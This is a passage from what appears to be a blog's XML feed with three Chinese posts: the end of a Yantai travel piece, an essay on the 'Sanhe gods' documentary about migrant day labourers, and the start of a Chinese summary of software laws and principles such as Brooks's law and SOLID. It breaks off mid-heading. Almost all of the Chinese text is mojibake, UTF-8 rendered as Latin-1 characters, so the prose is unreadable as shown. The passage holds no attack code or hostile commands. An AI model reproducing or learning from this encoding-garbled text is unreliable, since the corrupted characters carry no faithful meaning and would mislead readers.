´ç¢çš„è´å£³ã€‚è¿™é‡Œæ²¡æœ‰å¤ªæµ“çš„å•†ä¸šæ°”æ¯ï¼Œä»æœ‰æ¸”æ°‘å…»æ®–æµ·å‚ç­‰æµ·äº§å“ï¼Œè¿™é‡Œçš„å•†ä¸šå¸¦æ¥äº†äº¤é€šä¸é£Ÿå®¿çš„ä¾¿æ·ï¼Œåˆæ²¡æœ‰è¿‡å¤šçš„ç ´åè¿™é‡Œæœ¬è¯¥æœ‰çš„è‡ªç„¶é£æ™¯ï¼Œåœ¨æˆ‘å»è¿‡ä¸ºæ•°ä¸å¤šçš„æ™¯åŒºä¸­ï¼Œå¯ä»¥ç®—ä½œæ˜¯ä¸€è‚¡æ¸…æµäº†ã€‚è®¸å¤šæ™¯ç‚¹åœ¨è¶Šæ¥è¶Šæµ“çš„å•†ä¸šåŒ–è¿ä½œä¸­å˜å¾—é¢ç›®å…¨éï¼Œå¦‚æœä½ æƒ³è¦äº†è§£å½“åœ°äººçœŸå®çš„ç”Ÿæ´»ï¼Œæˆ–è®¸ä½ åº”è¯¥å»å…¬å›­çœ‹çœ‹å¹¿åœºèˆï¼Œå»åšç‰©é¦†çœ‹çœ‹è¿™åº§åŸå¸‚çš„è¿‡å¾€ï¼Œåå…¬äº¤è½¦çœ‹çœ‹æ™®é€šäººçš„æ—¥å¸¸ï¼Œåˆ°å¤§å­¦è¹­ä¸€é¡¿å»‰ä»·çš„ç¾å‘³åˆé¤ã€‚</p><p>åœ¨å…»é©¬å²›å¹ç€æµ·é£ã€ç¿»æ‰¾ç€è´å£³ã€å¬‰æˆç€æ¸…æ¾ˆçš„æµ·æ°´ï¼Œçœºæœ›ç€å¯¹é¢å¼±éŸ³è‹¥ç°çš„åŸå¸‚ï¼Œæ­¤åˆ»ï¼Œæˆ‘çœŸæ­£ç†è§£äº†â€œæµè¿å¿˜è¿”â€è¿™ä¸ªè¯ï¼Œå¯¹äºè¿™æ ·çš„ç¾æ™¯ï¼Œåªå¥½å°½æ”¶å¿«é—¨ã€‚ä½ ä¸çŸ¥é“ä¸‹æ¬¡æ¥æ˜¯å¦è¿˜ä¼šæœ‰åŒæ ·çš„æ„Ÿå—ï¼Œå¯èƒ½å¼€å§‹æ”¶é—¨ç¥¨äº†ï¼Œä¹Ÿå¯èƒ½å•†ä¸šåŒ–è¿ä½œæ›´æˆç†Ÿäº†ï¼Œä¹Ÿæœ‰å¯èƒ½è¿™é‡Œä»€ä¹ˆéƒ½æ²¡å˜ï¼Œè€Œä½ ç«™åœ¨ç›¸åŒçš„ä½ç½®å†ä¹Ÿæ²¡æœ‰äº†ç›¸åŒçš„æ„Ÿå—ã€‚æƒ³åšçš„äº‹ï¼Œå°±ç°åœ¨ã€‚</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wszlnalj31900u0hdi.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wugy1ifj31900u0kjm.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wvxefe4j31900u0x6q.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43ww8ba2pj31900u0qv6.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wweq27gj31900u0e81.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wwp4w4ej31900u0hdt.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wxagkcmj31900u07wi.jpg" alt=""></p><h3 id="çƒŸå°å¤§å­¦"><a href="#çƒŸå°å¤§å­¦" class="headerlink" title="çƒŸå°å¤§å­¦"></a>çƒŸå°å¤§å­¦</h3><p>ç”±äºå…»é©¬å²›å¤ªå¥½ç©äº†ï¼Œæ²¡èƒ½æ¥å¾—åŠå»çƒŸå¤§ï¼Œåªå¥½ä¸‹æ¬¡å†å»äº†ã€‚</p><h2 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h2><p>çƒŸå°å¤šå¹´è¢«è¯„ä¸ºå®œå±…åŸå¸‚æœç„¶åä¸è™šä¼ ï¼Œåˆæ¥æ­¤å¤„ä¾¿çˆ±ä¸Šäº†è¿™é‡Œï¼Œå¦‚æœæœ‰æœºä¼šï¼Œæˆ‘ä¼šå†æ¸¸çƒŸå°ã€‚æœç„¶æœ€èµšé’±çš„æ–¹æ³•éƒ½å†™åœ¨åˆ‘æ³•é‡Œï¼Œæœ€ç¾çš„é£æ™¯ä¸ä¸€å®šåœ¨æ™¯åŒºå†…ã€‚<br>äººç±»æ˜¯å¥å¿˜çš„ï¼Œé•œå¤´åªèƒ½è®°å½•ç¬é—´çš„æ•…äº‹ï¼Œè®©ä½ è®°å¿†æ·±åˆ»çš„æ•…äº‹ï¼Œä¸åœ¨é•œå¤´ä¸­ï¼Œè€Œåœ¨ç”¨å¿ƒæ‰€çœ‹åˆ°ä½ æœªæ›¾çœ‹åˆ°çš„åœ°æ–¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰å’Œå¤§ç¥</title>
      <link href="/post/sanhe-job-market/"/>
      <url>/post/sanhe-job-market/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g3y482cfbgj31hc0u0u0z.jpg" alt=""></p><p>ç«è½¦ç«™ï¼Œä¸€ä¸ªæ¢¦æƒ³å¼€å§‹ä¸ç»“æŸçš„åœ°æ–¹ã€‚</p><a id="more"></a><p>æ¯ä¸ªäººçš„äººç”Ÿéƒ½æ˜¯ä¸€åœºè½®å›ï¼Œä»å©´å„¿åˆ°å­©ç«¥ã€å†åˆ°é’å¹´ã€ä¸­å¹´ã€è€å¹´ï¼Œç›´è‡³æœ€åå˜æˆä¸€æŠ”é»„åœŸã€‚å†å²çš„è½¦è½®åœ¨ä¸æ–­çš„å‰è¿›ï¼Œæœ‰äº›äººåœ¨å†å²ä¸­ç† ç† ç”Ÿè¾‰ï¼Œæ›´å¤šçš„äººåˆ™æ¶ˆæ•£åœ¨å†å²çš„å°˜åŸƒä¸­ï¼Œä»¿ä½›ä»æœªé€ è®¿è¿‡è¿™ä¸ªä¸–ç•Œã€‚å¦‚æœè¯´æˆ‘ä»¬éƒ½é€ƒä¸è¿‡è¿™æ ·çš„è½®å›ï¼Œé‚£æˆ‘ä»¬èƒ½åšçš„å¯èƒ½åªæ˜¯æ”¹å˜è½®å›çš„åŠå¾„ã€‚</p><p>æˆ‘ä»¬æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„ç”Ÿæ´»åœˆå­ï¼Œå½“ä½ åœ¨å’Œæœ‹å‹è®¨è®ºäº”ä¸€å»å“ªå„¿æµªçš„æ—¶å€™ï¼Œæœ‰çš„äººå¯èƒ½æ­£è¶ç€åŸå¸‚çš„å¤œè‰²åœ¨åƒåœ¾ç®±ä¸­ç¿»æ‰¾ç€ç“¶å­ï¼Œæœ‰çš„äººè¿˜åœ¨ä¸ºå­©å­ä¸‹ä¸ªå­¦æœŸçš„å­¦è´¹å¥”æ³¢ï¼Œä¹Ÿæœ‰çš„äººåœ¨ä¸€æ¬¡æ¬¡çš„å¥‹æ–—æŒ£æ‰è¿‡åï¼Œå‘ç°å®ä½ä¸‹äº†éª„å‚²çš„å¤´é¢…â€¦â€¦æˆ‘ä»¬æ¯ä¸ªäººéƒ½æ˜¯â€œè¿‘è§†çœ¼â€ï¼Œå¾ˆå¤šäººæ— æ³•ç†è§£ä¸ºä»€ä¹ˆæ‹¼å¤šå¤šè¿™æ ·çš„å…¬å¸ä¹Ÿèƒ½å¤§è·æˆåŠŸï¼Ÿæ€ä¹ˆä¼šæœ‰äººè¿‡ç€ä»Šæœæœ‰é…’ä»Šæœé†‰çš„ç”Ÿæ´»ï¼Ÿä¸ºä»€ä¹ˆä¼šæœ‰äººèŠ±å‡ ç™¾ä¸‡ç¾å…ƒå’Œä¸€ä¸ªè€å¤´å­åƒä¸€é¡¿åˆé¥­ï¼Ÿè¿™ä¸ªä¸–ç•Œå¹¶ä¸å®Œå…¨æ˜¯ä½ æ‰€çœ‹åˆ°çš„æ ·å­ï¼Œåœ¨ä½ çœ¼é‡Œæ‰€å—å¤Ÿäº†çš„ç”Ÿæ´»ï¼Œå¯èƒ½æ­£æ˜¯åˆ«äººæ‰€æ¢¦æƒ³çš„ç”Ÿæ´»ã€‚æˆ‘ä»¬æ¯ä¸ªäººéƒ½éœ€è¦è·³å‡ºè‡ªå·±çš„ç”Ÿæ´»åœˆï¼Œç”¨æœ›è¿œé•œæ¥çœ‹çœ‹ä¸–ç•Œï¼Œçœ‹çœ‹è‡ªå·±ã€‚</p><p>æˆ‘è®¤ä¸ºï¼Œä¸‰å’Œå¤§ç¥æ˜¯æ—¶ä»£çš„äº§ç‰©ï¼š</p><ol><li>ä¸­å›½åŸå¸‚åŒ–çš„å¿«é€Ÿå‘å±•ï¼Œä¿ƒä½¿è®¸å¤šå†œæ°‘æ”¾ä¸‹è€•åœ°å’Œå­©å­ï¼Œå‰å¾€åŸå¸‚åŠ¡å·¥ã€‚ç•™å®ˆå„¿ç«¥ç¼ºå°‘çœ‹æŠ¤ä¸æ•™è‚²ã€‚</li><li>æ–°ä¸€ä»£å¹´è½»äººç”Ÿæ´»è§‚å¿µå‘ç”Ÿå¾ˆå¤§å˜åŒ–ã€‚ç”±äºæ”¹é©å¼€æ”¾çš„å‘å±•ï¼Œäººå£ä¸ä¿¡æ¯æµåŠ¨è¶Šæ¥è¶Šé¢‘ç¹ï¼Œå¹´è½»äººæ¥è§¦åˆ°å„ç§æ–°é²œäº‹ç‰©ä¸è§‚å¿µï¼Œä¸ä¼ ç»Ÿè§‚å¿µä¸­çš„æˆå®¶ç«‹ä¸šã€ä¼ å®—æ¥ä»£ä¸åŒï¼Œç°åœ¨å¹´è½»äººæ›´å¤šçœ‹é‡çš„æ˜¯æ´»åœ¨å½“ä¸‹ã€‚</li><li>å·¥å‚çš„é•¿æ—¶é—´åŠ³åŠ¨ï¼Œå¯¼è‡´å·¥äººå˜å¾—å¦‚è¡Œå°¸èµ°è‚‰ã€‚æˆ‘æ›¾ç»åšè¿‡ä¸€æ®µæ—¶é—´çš„æš‘æœŸå·¥ï¼Œæ¯å¤©å·¥ä½œ 12 ä¸ªå°æ—¶ï¼Œå·¥ä½œæ—¶é—´éƒ½æ˜¯ç«™ç«‹ï¼Œä¸­åˆä¹Ÿå‡ ä¹æ²¡æœ‰ä¼‘æ¯æ—¶é—´ã€‚å®¿èˆæ˜¯åå‡ ä¸ªäººæŒ¤åœ¨ä¸€é—´å±‹å­é‡Œï¼Œé€šé£æ¡ä»¶å¾ˆå·®ï¼Œå¤å¤©çš„æ™šä¸Šçƒ­çš„ç¡ä¸ç€ï¼Œä½†ç¬¬äºŒå¤©è¿˜è¦æ—©èµ·ç…§å¸¸ä¸Šç­ã€‚æ¯å¤©é™¤äº†å·¥ä½œ 12 å°æ—¶å¤–ï¼Œä¸Šä¸‹ç­è·¯ç¨‹ã€æ´—æ¼±ä¼‘æ¯æ—¶é—´é™¤å¤–ï¼ŒçœŸæ­£èƒ½ç¡è§‰çš„æ—¶é—´å¹¶ä¸å¤šï¼Œå¯èƒ½ä¹Ÿå°±å…­ä¸ƒä¸ªå°æ—¶ã€‚é‚£æ—¶æˆ‘æ¯å¤©éƒ½è§‰å¾—å¾ˆç´¯ï¼Œç¬¬ä¸€æ¬¡æ„Ÿè§‰åˆ°ä¸€å¤© 24 å°æ—¶çœŸçš„ä¸å¤Ÿç”¨ã€‚æœ‰ä¸€å¤©æˆ‘åœ¨ä¸‹ç­å›å»çš„è·¯ä¸Šï¼Œç«™äº†ä¸€å¤©çš„è„šå®åœ¨æ˜¯å¤ªç´¯äº†ï¼ŒåŠ ä¹‹å‰ä¸€å¤©æ™šä¸Šæ²¡ä¼‘æ¯å¥½ï¼Œé‚£æ—¶ï¼Œæˆ‘çœŸçš„åˆ‡èº«ä½“ä¼šåˆ°äº†ä»¥å‰åœ¨ã€Šè¯»è€…ã€‹ä¸­è¯»åˆ°çš„â€œæ‹–ç€ç–²æƒ«çš„èº«ä½“â€ï¼Œâ€œåŒè…¿åƒçŒäº†é“…ä¼¼çš„â€ï¼Œæˆ‘ç”šè‡³äº§ç”Ÿäº†ç›´æ¥èººåœ¨è·¯ä¸Šç¡è§‰çš„æƒ³æ³•â€¦â€¦æ¯å¤©æŒ‰æ—¶ä¸Šä¸‹ç­ï¼Œè¶…é•¿æ—¶é—´çš„é‡å¤åŠ³ä½œï¼Œå½“æˆ‘çœ‹ç€å‚æˆ¿çš„é“çª—æ—¶ï¼Œæ„Ÿè§‰å°±åƒä¸€åªè¢«å›šç¦çš„é¸Ÿå„¿ï¼Œæˆ‘å½“æ—¶åªæƒ³å°½å¿«é€ƒç¦»è¿™é‡Œï¼Œå¸Œæœ›æœªæ¥è¿œç¦»è¿™èˆ¬è¡Œå°¸èµ°è‚‰çš„ç”Ÿæ´»ã€‚</li></ol><p>åœ¨å½±ç‰‡ä¸­ï¼Œæœ‰äººåœ¨æ–­è‡‚åç”¨å¦ä¸€æ¡è‡‚è†€æ’‘èµ·ä¸€ä¸ªå®¶åº­ï¼Œæœ‰äººåœ¨å››è‚¢å¥å…¨ä¸‹æ”¾å¼ƒå¸Œæœ›ã€‚æˆ‘ç›¸ä¿¡æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„æ•…äº‹ï¼Œä½†ä¸æ˜¯æ¯ä¸ªæ•…äº‹éƒ½æ˜¯è¾›é…¸çš„ã€‚å¾ˆå¤šäººä¸æ˜¯è¢«è¿™ä¸ªä¸–ç•Œæ‰€æ”¾å¼ƒï¼Œè€Œæ˜¯ä»–è‡ªå·±ã€‚è¿™ä¸ªä¸–ç•Œæœ¬æ¥å°±æ˜¯ä¸å…¬çš„ï¼Œä½ æ— æ³•æ”¹å˜è¿™ä¸ªä¸–ç•Œï¼Œé‚£ä½ åªèƒ½æ”¹å˜è‡ªå·±ã€‚æ­£å¦‚ç‰‡ä¸­çš„è¾å­¦å¤§å­¦ç”Ÿæ‰€è¯´ï¼šåœ¨ç°åœ¨çš„çŠ¶æ€ä¸‹ï¼Œæˆ‘è¦ä¹ˆæ˜¯å°±æ­¤ä¸€è¹¶ä¸æŒ¯ï¼Œæˆä¸ºä¸‰å’Œå¤§ç¥ï¼Œè¦ä¹ˆå°±æ˜¯èµ°å‡ºç°åœ¨çš„å›°å¢ƒï¼Œåœ¨ä»Šåçš„æ—¥å­é‡Œæ›´åŠ çš„çæƒœç”Ÿå‘½ã€çƒ­çˆ±ç”Ÿå‘½ã€‚</p><p>åœ¨ä¿¡æ¯è‡ªåŠ¨åŒ–é«˜é€Ÿå‘å±•çš„ä»Šå¤©ï¼ŒæŠ€æœ¯é©å‘½å°†æ·˜æ±°æ‰è¶Šæ¥è¶Šå¤šçš„é‡å¤åŠ³ä½œå²—ä½ï¼Œè®©èµ„æœ¬å®¶ç”¨æ›´çŸ­çš„æ—¶é—´åˆ›é€ æ›´å¤šçš„è´¢å¯Œï¼Œè®©ä¸€æ— æ‰€æœ‰çš„äººå˜å¾—æ›´åŠ éš¾ä»¥ç”Ÿå­˜ã€‚èµ„äº§å®¶å’Œæ— äº§è€…é—´çš„é¸¿æ²Ÿä¸ä¼šå› æŠ€æœ¯è€Œæ¶ˆå¤±ï¼Œåªä¼šå½¢æˆæ›´å¼ºçš„é©¬å¤ªæ•ˆåº”ï¼Œè®©ç”Ÿæ´»åœ¨åº•å±‚çš„äººç¿»èº«çš„æœºä¼šæ›´åŠ æ¸ºèŒ«ã€‚</p><p>åœ¨æ•…äº‹çš„æœ€åï¼Œå³å°†æˆä¸ºä¸‰å’Œå¤§ç¥çš„ä¸œä¸œå†³å®šç¦»å¼€æ·±åœ³ï¼Œå‰å¾€ä¸œèè¿½å¯»æ–°çš„æ¢¦æƒ³ã€‚åœ¨å»å¾€ä¸œèçš„è½¦ç«™ï¼Œåˆæœ‰è®¸å¤šæ‰‹æè¡Œæç®±çš„å¹´è½»äººåˆšåˆšè¸ä¸Šè¿™åº§åŸå¸‚â€¦â€¦</p>]]></content>
      
      
      <categories>
          
          <category> å½±åƒå¿— </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶å®šå¾‹åŠåŸåˆ™</title>
      <link href="/post/hacker-laws/"/>
      <url>/post/hacker-laws/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g39pcz3brtj30hs0cgab6.jpg" alt=""></p><p>Repo <a href="https://github.com/nusr/hacker-laws-zh" target="_blank" rel="noopener">ğŸ’»ğŸ“– hacker-laws</a> </p><a id="more"></a><h2 id="å®šå¾‹"><a href="#å®šå¾‹" class="headerlink" title="å®šå¾‹"></a>å®šå¾‹</h2><h3 id="1-é˜¿å§†è¾¾å°”å®šå¾‹"><a href="#1-é˜¿å§†è¾¾å°”å®šå¾‹" class="headerlink" title="1. é˜¿å§†è¾¾å°”å®šå¾‹"></a>1. é˜¿å§†è¾¾å°”å®šå¾‹</h3><blockquote><p><em>å‘æ‰§è¡Œç¨‹åºçš„ç³»ç»Ÿæ·»åŠ å¤šä¸ªå¤„ç†å™¨åªèƒ½è·å¾—æœ‰é™çš„å¥½å¤„ï¼Œå®ƒå¯ä»¥æå¤§åœ°æå‡å¹¶è¡Œç¨‹åºçš„é€Ÿåº¦ï¼Œä¸²è¡Œéƒ¨åˆ†çš„é€Ÿåº¦å°†ä¿æŒä¸å˜ã€‚</em><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g391y0tu7wj30hs0dwjs0.jpg" alt=""></p></blockquote><h3 id="2-å¸ƒé²å…‹æ–¯æ³•åˆ™"><a href="#2-å¸ƒé²å…‹æ–¯æ³•åˆ™" class="headerlink" title="2. å¸ƒé²å…‹æ–¯æ³•åˆ™"></a>2. å¸ƒé²å…‹æ–¯æ³•åˆ™</h3><blockquote><p><em>è½¯ä»¶å¼€å‘åæœŸï¼Œæ·»åŠ äººåŠ›åªä¼šæ˜¯é¡¹ç›®å¼€å‘å¾—æ›´æ…¢ã€‚</em></p></blockquote><p>æ— è®ºå¤šå°‘ä¸ªå¥³äººï¼Œå­•è‚²ä¸€ä¸ªç”Ÿå‘½ä¹Ÿéœ€è¦ä¹ä¸ªæœˆã€‚</p><h3 id="3-åº·å¨å®šå¾‹"><a href="#3-åº·å¨å®šå¾‹" class="headerlink" title="3. åº·å¨å®šå¾‹"></a>3. åº·å¨å®šå¾‹</h3><blockquote><p><em>è½¯ä»¶æ¶æ„åæ˜ äº†ç»„ç»‡ç»“æ„ã€‚</em></p></blockquote><h3 id="4-ä¾¯ä¸–è¾¾å®šå¾‹"><a href="#4-ä¾¯ä¸–è¾¾å®šå¾‹" class="headerlink" title="4. ä¾¯ä¸–è¾¾å®šå¾‹"></a>4. ä¾¯ä¸–è¾¾å®šå¾‹</h3><blockquote><p><em>åšäº‹æ‰€èŠ±è´¹çš„æ—¶é—´æ€»æ˜¯æ¯”ä½ é¢„æœŸçš„è¦é•¿ï¼Œå³ä½¿ä½ çš„é¢„æœŸä¸­è€ƒè™‘äº†ä¾¯ä¸–è¾¾å®šå¾‹ã€‚</em></p></blockquote><h3 id="5-æŠ€æœ¯æˆç†Ÿåº¦æ›²çº¿"><a href="#5-æŠ€æœ¯æˆç†Ÿåº¦æ›²çº¿" class="headerlink" title="5. æŠ€æœ¯æˆç†Ÿåº¦æ›²çº¿"></a>5. æŠ€æœ¯æˆç†Ÿåº¦æ›²çº¿</h3><blockquote><p><em>æˆ‘ä»¬å€¾å‘äºè¿‡é«˜ä¼°è®¡æŠ€æœ¯åœ¨çŸ­æœŸå†…çš„å½±å“ï¼Œå¹¶ä½ä¼°é•¿æœŸæ•ˆåº”ã€‚</em><br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g391wbrqtbj30sg0iiab9.jpg" alt=""></p></blockquote><h3 id="6-éšå¼æ¥å£å®šå¾‹"><a href="#6-éšå¼æ¥å£å®šå¾‹" class="headerlink" title="6. éšå¼æ¥å£å®šå¾‹"></a>6. éšå¼æ¥å£å®šå¾‹</h3><blockquote><p><em>ä½ åœ¨åˆåŒä¸­çš„æ‰¿è¯ºå¹¶ä¸é‡è¦ï¼š ä½ ç³»ç»Ÿçš„æ‰€æœ‰å¯è§‚å¯Ÿè¡Œä¸ºå°†å–å†³äºå…¶ä»–äººã€‚</em></p></blockquote><p>åº”è¯¥æ˜¯æŒ‡ï¼šå³ä½¿ä½ æŸäº›æ–¹æ³•ä»…é™å†…éƒ¨ä½¿ç”¨ï¼Œä½†ä»ç„¶ä¼šæœ‰äº›äººå°†è¿™äº›æ–¹æ³•ç”¨äºå¤–éƒ¨è°ƒç”¨</p><h3 id="7-æ‘©å°”å®šå¾‹"><a href="#7-æ‘©å°”å®šå¾‹" class="headerlink" title="7. æ‘©å°”å®šå¾‹"></a>7. æ‘©å°”å®šå¾‹</h3><blockquote><p><em>é›†æˆç”µè·¯ä¸­çš„æ™¶ä½“ç®¡æ•°é‡å¤§çº¦æ¯ä¸¤å¹´ç¿»ä¸€ç•ªã€‚</em></p></blockquote><h3 id="8-å¸•é‡‘æ£®å®šç†"><a href="#8-å¸•é‡‘æ£®å®šç†" class="headerlink" title="8. å¸•é‡‘æ£®å®šç†"></a>8. å¸•é‡‘æ£®å®šç†</h3><blockquote><p><em>åœ¨å·¥ä½œèƒ½å¤Ÿå®Œæˆçš„æ—¶é™å†…ï¼Œå·¥ä½œé‡ä¼šä¸€ç›´å¢åŠ ï¼Œç›´åˆ°æ‰€æœ‰å¯ç”¨æ—¶é—´éƒ½è¢«å¡«æ»¡ä¸ºæ­¢ã€‚</em></p></blockquote><h3 id="9-æ™®ç‰¹å®šå¾‹"><a href="#9-æ™®ç‰¹å®šå¾‹" class="headerlink" title="9. æ™®ç‰¹å®šå¾‹"></a>9. æ™®ç‰¹å®šå¾‹</h3><blockquote><p><em>æŠ€æœ¯ç”±ä¸¤ç±»äººä¸»å¯¼ï¼Œä¸€ç±»æ˜¯çº¯ç²¹çš„ç®¡ç†äººå‘˜ï¼Œ ä¸€ç±»æ˜¯çº¯ç²¹çš„æŠ€æœ¯äººå‘˜ã€‚</em></p></blockquote><p>æ²¡å¤ªçœ‹æ˜ç™½ï¼Œæ˜¯æŒ‡æŠ€æœ¯é¢†å¯¼é•¿æœŸä¸æ¥è§¦ä¸€çº¿ä»£ç å¯¼è‡´æŠ€æœ¯èƒ½åŠ›ä¸‹é™å—ï¼Ÿ</p><h3 id="10-å¤æ‚æ€§å®ˆæ’å®šå¾‹"><a href="#10-å¤æ‚æ€§å®ˆæ’å®šå¾‹" class="headerlink" title="10. å¤æ‚æ€§å®ˆæ’å®šå¾‹"></a>10. å¤æ‚æ€§å®ˆæ’å®šå¾‹</h3><blockquote><p><em>ç³»ç»Ÿä¸­å­˜åœ¨ç€ä¸€å®šç¨‹åº¦çš„å¤æ‚æ€§ï¼Œå¹¶ä¸”ä¸èƒ½å‡å°‘ã€‚</em></p></blockquote><h3 id="11-æ¼æ´æŠ½è±¡å®šå¾‹"><a href="#11-æ¼æ´æŠ½è±¡å®šå¾‹" class="headerlink" title="11. æ¼æ´æŠ½è±¡å®šå¾‹"></a>11. æ¼æ´æŠ½è±¡å®šå¾‹</h3><blockquote><p><em>åœ¨æŸç§ç¨‹åº¦ä¸Šï¼Œæ‰€æœ‰éå¹³å‡¡çš„æŠ½è±¡éƒ½æ˜¯æ¼æ´ã€‚</em></p></blockquote><p>å®šä¹‰å¤ªæ‹—å£äº†ï¼Œç›´æ¥çœ‹ä¾‹å­å§ã€‚</p><p>æˆ‘è¿‡å»é‡åˆ°è¿‡ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ Photoshop å¯åŠ¨ç¼“æ…¢ï¼Œæœ‰æ—¶éœ€è¦å‡ åˆ†é’Ÿã€‚é—®é¢˜å¥½åƒæ˜¯ Photoshop å¯åŠ¨æ—¶ï¼Œä¼šè¯»å–å½“å‰é»˜è®¤æ‰“å°æœºçš„ä¸€äº›ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¯¥æ‰“å°æœºå®é™…ä¸Šæ˜¯ä¸€å°ç½‘ç»œæ‰“å°æœºï¼Œåˆ™å¯èƒ½éœ€è¦å¾ˆé•¿çš„æ—¶é—´ã€‚å°†ç½‘ç»œæ‰“å°æœºä¸æœ¬åœ°æ‰“å°æœºå½“ä½œåŒæ ·çš„æŠ½è±¡ï¼Œå¯¼è‡´è¿æ¥ä¸è‰¯çš„æƒ…å†µä¸‹å‡ºç°é—®é¢˜ã€‚</p><h3 id="12-å¸•é‡‘æ£®çç¢å®šç†"><a href="#12-å¸•é‡‘æ£®çç¢å®šç†" class="headerlink" title="12. å¸•é‡‘æ£®çç¢å®šç†"></a>12. å¸•é‡‘æ£®çç¢å®šç†</h3><blockquote><p><em>ç¾¤ä½“å°†ç»™äºˆæ›´å¤šçš„æ—¶é—´å’Œæ³¨æ„åŠ›æ¥å¤„ç†çç¢çš„é—®é¢˜ï¼Œè€Œä¸æ˜¯ç”¨æ¥å¤„ç†ä¸¥è‚ƒè€Œå®è´¨æ€§çš„é—®é¢˜ã€‚</em></p></blockquote><p>å¸¸è§çš„è™šæ„ä¾‹å­æ˜¯å§”å‘˜ä¼šæ‰¹å‡†æ ¸ç”µç«™çš„è®¡åˆ’ï¼Œä»–ä»¬å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨è®¨è®ºè‡ªè¡Œè½¦æ£šçš„ç»“æ„ï¼Œè€Œä¸æ˜¯ç”µå‚æœ¬èº«ç­‰æ›´ä¸ºé‡è¦çš„è®¾è®¡ã€‚</p><h3 id="13-Unix-å“²å­¦"><a href="#13-Unix-å“²å­¦" class="headerlink" title="13. Unix å“²å­¦"></a>13. Unix å“²å­¦</h3><blockquote><p><strong>*åšä¸€ä»¶äº‹ï¼Œåšå¥½å®ƒ</strong>ã€‚å°†å°è€Œç®€å•ä»¥åŠå®šä¹‰è‰¯å¥½çš„å•å…ƒç»„åˆåœ¨ä¸€èµ·ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å¤§è€Œå¤æ‚çš„å¤šç”¨é€”ç¨‹åºï¼Œå¯ä»¥æ›´è½»æ¾åœ°æ„å»ºç³»ç»Ÿã€‚*</p></blockquote><ul><li>å°å³æ˜¯ç¾</li><li>è®©ç¨‹åºåªåšå¥½ä¸€ä»¶äº‹</li><li>å°½å¯èƒ½æ—©åœ°å»ºç«‹åŸå‹</li><li>å¯ç§»æ¤æ€§æ¯”æ•ˆç‡æ›´é‡è¦</li><li>æ•°æ®åº”è¯¥ä¿å­˜ä¸ºæ–‡æœ¬æ–‡ä»¶</li><li>å°½å¯èƒ½åœ°æ¦¨å–è½¯ä»¶çš„å…¨éƒ¨ä»·å€¼</li><li>ä½¿ç”¨shellè„šæœ¬æ¥æé«˜æ•ˆç‡å’Œå¯ç§»æ¤æ€§</li><li>é¿å…ä½¿ç”¨å¯å®šåˆ¶æ€§ä½ä¸‹çš„ç”¨æˆ·ç•Œé¢</li><li>æ‰€æœ‰ç¨‹åºéƒ½æ˜¯æ•°æ®çš„è¿‡æ»¤å™¨</li></ul><h3 id="14-Spotify-æ¨¡å‹"><a href="#14-Spotify-æ¨¡å‹" class="headerlink" title="14. Spotify æ¨¡å‹"></a>14. Spotify æ¨¡å‹</h3><blockquote><p><em>å›¢é˜Ÿå›´ç»•åŠŸèƒ½è€ŒéæŠ€æœ¯è¿›è¡Œç»„ç»‡ã€‚</em></p></blockquote><h2 id="åŸåˆ™"><a href="#åŸåˆ™" class="headerlink" title="åŸåˆ™"></a>åŸåˆ™</h2><h3 id="1-é²æ£’æ€§åŸåˆ™"><a href="#1-é²æ£’æ€§åŸåˆ™" class="headerlink" title="1. é²æ£’æ€§åŸåˆ™"></a>1. é²æ£’æ€§åŸåˆ™</h3><blockquote><p><em>åœ¨è‡ªå·±æ‰€åšçš„äº‹æƒ…ä¸Šè¦ä¿å®ˆ, åœ¨æ¥å—åˆ«äººçš„äº‹æƒ…ä¸Šè¦è‡ªç”±ã€‚</em></p></blockquote><p>é€šå¸¸åº”ç”¨äºæœåŠ¡å™¨åº”ç”¨ç¨‹åºå¼€å‘ä¸­ï¼Œè¯¥åŸåˆ™æŒ‡å‡ºï¼Œä½ å‘é€ç»™å…¶ä»–äººçš„å†…å®¹åº”å°½å¯èƒ½æœ€å°ä¸”ç¬¦åˆè¦æ±‚ï¼Œå¹¶ä¸”å¤„ç†ä¸ç¬¦åˆè¦æ±‚çš„è¾“å…¥ã€‚</p><h3 id="2-SOLID"><a href="#2-SOLID" class="headerlink" title="2. SOLID"></a>2. SOLID</h3><ul><li>Sï¼šå•ä¸€åŠŸèƒ½åŸåˆ™ (The Single Responsibility Principle)</li><li>Oï¼šå¼€é—­åŸåˆ™ (The Open/Closed Principle)</li><li>Lï¼šé‡Œæ°æ›¿æ¢åŸåˆ™ (The Liskov Substitution Principle)</li><li>Iï¼šæ¥å£éš”ç¦»åŸåˆ™ (The Interface Segregation Principle)</li><li>Dï¼šä¾èµ–åè½¬åŸåˆ™ (The Dependency Inversion Principle)</li></ul><h4 id="2-1-å•ä¸€åŠŸèƒ½åŸåˆ™"><a href="#2-1-å•ä¸€åŠŸèƒ½åŸåˆ™" class="headerlink" title="2.1 å•ä¸€åŠŸèƒ½åŸåˆ™"></a>2.1 